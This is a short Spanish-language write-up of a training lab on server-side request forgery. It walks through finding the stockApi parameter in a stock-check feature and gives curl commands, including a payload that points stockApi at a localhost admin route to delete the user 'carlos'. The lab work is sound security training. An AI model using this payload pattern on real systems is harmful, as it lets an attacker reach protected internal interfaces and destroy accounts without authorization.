Nombre del Lab: SSRF Básico (Acceso a Localhost)
Tema: Server-Side Request Forgery (SSRF)

Herramientas: curl

1. Reconocimiento e Identificación
Se realiza un análisis inicial de la aplicación utilizando curl con el modo verbose (-v) para inspeccionar las cabeceras y el cuerpo de la respuesta.

Hallazgo: Al interactuar con la función de "Check stock", se observa que la aplicación envía una petición POST al endpoint /product/stock.

Punto de Entrada: El parámetro stockApi recibe una URL completa que apunta a un servicio interno para verificar las existencias. Esto indica que el servidor actúa como cliente para obtener datos de otra interfaz interna.

2. Análisis de Vulnerabilidad
La falta de validación en el parámetro stockApi permite realizar un ataque de SSRF. Dado que el servidor confía en las peticiones que se originan desde su propia interfaz, es posible forzarlo a realizar peticiones a servicios protegidos que no están expuestos a internet, como la interfaz administrativa local (localhost).

3. Explotación y Resultados
Se modifica el valor del parámetro stockApi para que, en lugar de consultar el stock, apunte a la ruta administrativa de eliminación de usuarios.

Comandos Utilizados:

Fase de reconocimiento:

Bash

curl -v "https://[ID_DEL_LAB].web-security-academy.net/product?productId=1"
Fase de explotación (Borrado de usuario):

Bash

curl -X POST "https://[ID_DEL_LAB].web-security-academy.net/product/stock" \
-d "stockApi=http://localhost/admin/delete?username=carlos"
4. Conclusión
Se logró manipular la petición del lado del servidor para interactuar con la interfaz de localhost, logrando privilegios administrativos y eliminando con éxito al usuario carlos
